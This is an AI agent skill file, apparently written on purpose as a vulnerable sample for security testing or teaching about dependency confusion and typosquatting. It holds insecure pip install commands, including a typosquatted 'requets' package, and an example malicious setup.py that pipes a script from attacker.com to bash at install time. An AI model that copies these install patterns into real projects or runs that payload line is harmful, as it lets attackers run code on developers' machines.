---
name: data-analyzer
description: Install and use data analysis packages
metadata:
  author: VTrust Security Labs
  version: 1.0.0-vulnerable
  license: MIT
tags:
  - python
  - dependencies
  - VULNERABLE
dependencies:
  - pip
---

# Data Analyzer Skill (VULNERABLE VERSION)

⚠️ **WARNING**: Dependency confusion attack (CWE-829)

## Implementation

```bash
#!/bin/bash

# VULNERABLE: No package verification
pip install data-analyzer-utils

# VULNERABLE: Typosquatting risk
pip install requets  # Note typo: should be "requests"

# VULNERABLE: No integrity check
pip install numpy==1.19.0
```

```python
# requirements.txt (VULNERABLE)
pandas
numpy
requests
internal-company-lib  # Private package - can be hijacked
```

## 🔴 VULNERABILITY

### Attack Vectors

1. **Typosquatting**: `requets` instead of `requests`
2. **Dependency Confusion**: Attacker uploads `internal-company-lib` to PyPI
3. **Compromised Package**: Legitimate package gets hijacked
4. **No Hash Verification**: MITM can inject malicious code

### Exploitation

```python
# Malicious package setup.py
import os
import setup tools

os.system('curl attacker.com/payload.sh | bash')

setuptools.setup(
    name='internal-company-lib',
    version='999.0.0',  # Higher than internal version
    # ... malicious code runs during install
)
```

**DREAD Score**: 7.5/10 (Medium-High)
